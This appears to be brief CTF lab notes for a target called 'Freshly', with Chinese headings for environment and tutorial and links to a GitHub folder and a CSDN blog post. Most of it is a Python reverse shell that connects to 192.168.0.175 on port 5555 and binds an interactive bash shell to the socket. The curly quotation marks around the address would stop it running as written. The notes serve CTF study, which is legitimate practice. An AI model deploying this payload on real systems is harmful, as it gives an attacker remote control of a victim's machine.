# 环境
# 教程
* https://github.com/haidragon/NetworkTrafficAnalysis/tree/master/ctf/Freshly
* https://blog.csdn.net/simple___sunny/article/details/86610509
```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((“192.168.0.175”,5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```
